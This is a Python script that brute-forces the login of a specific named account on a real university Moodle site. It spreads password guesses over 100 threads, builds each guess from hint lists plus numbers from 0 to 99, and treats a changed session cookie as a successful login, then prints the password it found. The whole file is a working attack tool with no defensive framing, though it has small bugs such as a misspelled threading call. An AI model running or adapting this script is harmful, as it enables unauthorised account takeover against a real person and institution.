import requests
import itertools
import time
import threading
from queue import Queue
import sys
import os
#---------------

#Global Variables
url="https://moodle.niituniversity.in/moodle/login/index.php"
user="chowdavarapu.sriker"
combinations=8*8*8*8*8*8*8*8
print("Total possible combinations 900\n")
timeExe = time.time()
#res = itertools.permutations('srikar1.',8)
arr1=["you hints here"]
arr2=["Second set of hints"]
arr3=[]

for z in range(100):
    arr3.append(str(z))
res=itertools.product(arr1,arr2,arr3)
Failscount = 0 

#File Object
f=open("password.txt","w+")

#Queue Object
q = Queue()

#Print_lock
print_lock=threading.Lock()

#Threader Function
def threader():
    while True:
        combination=q.get()
        passwordCracker(combination)
        q.task_done

#passwordCracker Function
def passwordCracker(combination):
    try:
        s=requests.Session()
        r=s.get(url)
        session1=r.cookies["MoodleSession"]
        pas="".join(combination)
        login_data=dict(username=user,password=pas)
        s.post(url,data=login_data)
        session2=s.cookies["MoodleSession"] 
        for fake in range(1):
            if session1!=session2:
                with print_lock:
                    #print("[+] PASSWORD FOUND - " + str(pas))
                    sys.stdout.write("\r[+] PASSWORD FOUND - " + str(pas))
                    print("Time Executed - " + str(timeExe - time.time()))
                    print("Password found by " + str(threading.currnet_thread().name))
                    sys.stdout.flush()
                sys.stdout.write("\n")
                os._exit(1)
            else:
                global Failscount
                Failscount = Failscount + 1
                with print_lock:
                    sys.stdout.write("\r Fails - " + str(Failscount))
                    sys.stdout.write(" [-] not match - " + str(pas))
                    sys.stdout.flush()
                #sys.stdout.write("\n")
                    #print("[-] " + str(pas) + " not Match")
    except Exception as e:
        #print(str(e) + "\n")
        time.sleep(5)

#Creating Threads
for thread in range(100):
    th = threading.Thread(target=threader)
    th.daemon = True
    th.start()

#putting the res values in to the Queue
for eachCombination in res:
    q.put(eachCombination)
q.join()
